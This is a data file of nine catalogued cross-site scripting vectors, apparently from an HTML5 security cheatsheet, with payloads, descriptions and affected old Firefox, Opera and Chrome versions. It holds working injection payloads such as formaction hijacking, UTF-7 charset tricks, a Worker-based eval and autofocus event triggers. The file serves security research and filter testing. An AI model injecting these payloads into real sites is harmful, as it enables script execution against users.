/* Items - the set of available items and vectors */
{
    'items': [
        { /* ID 1 - XSS via formaction - requiring user interaction */
            'id'         : 1, 
            'category'   : 'html5', 
            'name'       : 'XSS via formaction - requiring user interaction',
            'data'       : '<form id="test" /><button form="test" formaction="%js_uri_alert%">X',
            'description': 'A vector displaying the HTML5 form and formaction capabilities for form hijacking outside the actual form.',
            'tickets'    : [],
			'howtofix'   : 'Don\'t allow users to submit markup containing form and formaction attributes or transform them to bogus attributes',
			'browsers'   : {
                'opera': ['10.5']
            },
            'tags'       : ['xss', 'html5', 'ff', 'gc'],
            'reporter'   : '.mario'
        },
        { /* ID 2 - XSS via x-imap4-modified-utf7 (1) */
            'id'         : 2, 
            'category'   : 'utf7', 
            'name'       : 'XSS via x-imap4-modified-utf7 (1)',
            'data'       : '<meta charset="x-imap4-modified-utf7">%js_utf7_alert_1%',
            'description': 'This vector shows how UTF7 derivations can be used to generate very hard to detect XSS vectors in exotic charsets',
            'tickets'    : [],
            'howtofix'   : '',
            'browsers'   : {
                'firefox': [
                    '2.x', '3.5', '3.6', '3.7'
                ]
            },
            'tags'       : ['xss', 'utf7', 'ff', 'charset'],
            'reporter'   : '.mario'
        },
        { /* ID 3 - XSS via x-imap4-modified-utf7 (2) */
            'id'         : 3, 
            'category'   : 'utf7', 
            'name'       : 'XSS via x-imap4-modified-utf7 (2)',
            'data'       : '<meta charset="x-imap4-modified-utf7">%js_utf7_alert_2%',
            'description': 'This vector shows how UTF7 derivations can be used to generate very hard to detect XSS vectors in exotic charsets',
            'tickets'    : [],
            'howtofix'   : '',            
			'browsers'   : {
                'firefox': [
                    '2.x', '3.5', '3.6', '3.7'
                ]
            },
            'tags'       : ['xss', 'utf7', 'ff', 'charset'],
            'reporter'   : '.mario'
        },
        { /* ID 4 - Self-including DOM Worker XSS */
            'id'         : 4, 
            'category'   : 'dom', 
            'name'       : 'Self-including DOM Worker XSS',
            'data'       : '0?<script>Worker("#").onmessage=function(_)eval(_.data)</script>:postMessage(importScripts(\'data:;base64,cG9zdE1lc3NhZ2UoJ2FsZXJ0KDEpJyk\'))',
            'description': 'A self-including code snippet utilizing a DOM worker and firing a message event to itself causing script execution',
            'tickets'    : [],
            'howtofix'   : '',            
			'browsers'   : {
                'firefox': [
                    '3.5', '3.6', '3.7'
                ]
            },
            'tags'       : ['xss', 'dom', 'ff', 'worker'],
            'reporter'   : '.mario'
        },
        { /* ID 5 - Firefox crypto object - hidden eval() */
            'id'         : 5, 
            'category'   : 'dom', 
            'name'       : 'Firefox crypto object - hidden eval()',
            'data'       : 'crypto.generateCRMFRequest(\'CN=0\',0,0,null,\'%js_alert%\',384,null,\'rsa-dual-use\')',
            'description': 'This vector uncovers a hidden eval() inside the Firefox crypto object',
            'tickets'    : [],
            'howtofix'   : '',            
			'browsers'   : {
                'firefox': [
                    '2.x', '3.x', '3.5', '3.6', '3.7'
                ]
            },
            'tags'       : ['xss', 'dom', 'ff', 'crypto', 'eval', 'csp'],
            'reporter'   : '.mario'
        },
        { /* ID 6 - Firefox setter based JavaScript execution */
            'id'         : 6, 
            'category'   : 'javascript', 
            'name'       : 'Firefox setter based JavaScript execution',
            'data'       : '({set/**/$($){_/**/setter=$,_=1}}).$=%js_alert_only%',
            'description': 'Using setters on Gecko/Firefox to execute JavaScript without parenthesis',
            'tickets'    : [],
            'howtofix'   : '',            
			'browsers'   : {
                'firefox': [
                    '1.x', '2.x', '3.x', '3.5', '3.6', '3.7'
                ]
            },
            'tags'       : ['xss', 'dom', 'ff', 'setter'],
            'reporter'   : '.mario'
        },
        { /* ID 7 - Self-executing focus event via autofocus */
            'id'         : 7, 
            'category'   : 'html5', 
            'name'       : 'Self-executing focus event via autofocus',
            'data'       : '<input onfocus=%js_write% autofocus>',
            'description': 'This vector uses an input element with autofocus to call its own focus event handler - no user interaction required',
            'tickets'    : [],
            'howtofix'   : '',            
			'browsers'   : {
                'opera': [
                    '10.5'
                ],
                'chrome': [
                    '4.0', '5.0'
                }
            },
            'tags'       : ['xss', 'autofocus', 'chrome', 'opera'],
            'reporter'   : 'gaz'
        },
        { /* ID 8 - Self-executing blur event via neighboured */
            'id'         : 8, 
            'category'   : 'html5', 
            'name'       : 'Self-executing blur event via autofocus competition',
            'data'       : '<input onblur=%js_write% autofocus><input autofocus>',
            'description': 'Here we have two HTML input elements competing for the focus - and one executing JavaScript on losing its focus',
            'tickets'    : [],
            'howtofix'   : '',            
			'browsers'   : {
                'opera': [
                    '10.5'
                ],
                'chrome': [
                    '4.0', '5.0'
                }
            },
            'tags'       : ['xss', 'autofocus', 'blur', 'chrome', 'opera'],
            'reporter'   : '.mario'
        },
        { /* ID 9 - Self-executing blur event via neighboured */
            'id'         : 9, 
            'category'   : 'css', 
            'name'       : 'Opera link-source JavaScript execution via CSS',
            'data'       : '<div style="-o-link:\'%js_uri_alert%\';-o-link-source:current">X',
            'description': 'Opera allows setting link sources for arbitrary HTML elements - making them clickable and execute JavaScript',
            'tickets'    : [],
            'howtofix'   : '',            
			'browsers'   : {
                'opera': [
                    '8.0', '9.0', '10.0', '10.5'
                ]
            },
            'tags'       : ['xss', 'css', 'link-source', 'opera'],
            'reporter'   : '.mario'
        } 
    ]        
}
